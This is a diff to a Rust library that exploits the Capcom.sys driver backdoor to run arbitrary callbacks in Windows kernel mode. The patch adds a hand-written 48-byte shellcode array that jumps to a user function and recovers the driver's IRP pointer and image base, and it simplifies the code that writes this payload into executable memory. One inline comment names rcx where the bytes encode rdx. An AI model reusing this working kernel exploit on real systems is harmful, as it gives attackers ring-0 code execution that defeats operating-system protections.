@@ -698,6 +698,30 @@ unsafe fn enable_privilege(privilege_name: &[u16]) -> bool {
 
 //----------------------------------------------------------------
 
+static PAYLOAD: [u8; 48] = [
+	// Pointer to payload code, required by Capcom backdoor
+	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+	// Pointer to the user callback, called after setup
+	// movabs rax, user_fn
+	0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+	// Pointer to the user data context
+	// movabs rcx, user_data
+	0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+	// Capcom keeps its IRP pointer in rbx
+	// mov r8, rbx
+	0x49, 0x89, 0xD8,
+	// Get the Capcom.sys image base from the return address
+	// mov r9, qword ptr [rsp]
+	// sub r9, 0x577
+	0x4C, 0x8B, 0x0C, 0x24,
+	0x49, 0x81, 0xE9, 0x77, 0x05, 0x00, 0x00,
+	// Jump to the user callback
+	// jmp rax
+	0xFF, 0xE0,
+	// Padding to make the payload 3 * 16 bytes (for no reason really...)
+	0xCC, 0xCC, 0xCC, 0xCC,
+];
+
 /// Capcom device.
 #[derive(Debug)]
 pub struct Device {
@@ -713,6 +737,7 @@ impl Device {
 			let device = CreateFileW(CAPCOM_DEVICE.as_ptr(), FILE_ALL_ACCESS, FILE_SHARE_READ, ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
 			if device != INVALID_HANDLE_VALUE {
 				let payload = VirtualAlloc(ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) as *mut u8;
+				*(payload as *mut [u8; 48]) = PAYLOAD;
 				Ok(Device { device, payload })
 			}
 			else {
@@ -738,8 +763,8 @@ impl Device {
 		// Invoke the IOCTL
 		self.ioctl()
 	}
-	unsafe extern "system" fn elevate_thunk<F: FnMut(Context)>(get_system_routine_address: MmGetSystemRoutineAddressFn, user_data: *mut F) {
-		let ctx = Context { get_system_routine_address };
+	unsafe extern "system" fn elevate_thunk<F: FnMut(Context)>(get_system_routine_address: MmGetSystemRoutineAddressFn, user_data: *mut F, irp: usize, capcom_base: usize) {
+		let ctx = Context { get_system_routine_address, irp, capcom_base };
 		(*user_data)(ctx);
 	}
 
@@ -747,24 +772,9 @@ impl Device {
 	fn codegen(&self, user_fn: usize, user_data: usize) {
 		unsafe {
 			let payload = self.payload;
-
-			// Prepare the payload, required by the capcom backdoor
-			*(payload.offset(0) as *mut *mut u8) = payload.offset(8);
-
-			// MOV RAX, thunk
-			*payload.offset(8 + 0) = 0x48;
-			*payload.offset(8 + 1) = 0xB8;
-			*(payload.offset(8 + 2) as *mut usize) = user_fn;
-
-			// the first argument, RCX, is set by capcom to the address of MmGetSystemRoutineAddress
-			// MOV RDX, user_data
-			*payload.offset(18 + 0) = 0x48;
-			*payload.offset(18 + 1) = 0xBA;
-			*(payload.offset(18 + 2) as *mut usize) = user_data;
-
-			// JMP RAX
-			*payload.offset(28 + 0) = 0xFF;
-			*payload.offset(28 + 1) = 0xE0;
+			ptr::write_unaligned(payload.offset(0) as *mut *mut u8, payload.offset(8));
+			ptr::write_unaligned(payload.offset(10) as *mut usize, user_fn);
+			ptr::write_unaligned(payload.offset(20) as *mut usize, user_data);
 		}
 	}
 	/// Invokes the Capcom IOCTL.
@@ -801,6 +811,8 @@ pub type MmGetSystemRoutineAddressFn = unsafe extern "system" fn(name: PUNICODE_
 pub struct Context {
 	/// [`MmGetSystemRoutineAddress`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-mmgetsystemroutineaddress).
 	pub get_system_routine_address: MmGetSystemRoutineAddressFn,
+	pub irp: usize,
+	pub capcom_base: usize,
 }
 
 //----------------------------------------------------------------
